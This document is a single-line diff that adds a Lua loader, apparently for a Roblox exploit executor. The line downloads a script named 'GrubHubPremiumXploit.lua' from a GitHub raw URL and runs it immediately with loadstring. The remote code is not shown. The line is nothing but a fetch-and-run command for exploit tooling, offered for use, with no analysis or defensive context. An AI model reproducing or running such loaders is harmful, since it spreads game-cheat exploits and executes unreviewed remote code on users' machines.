@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Boxking776/GrubHubNonPremium/main/GrubHubPremiumXploit.lua"))()
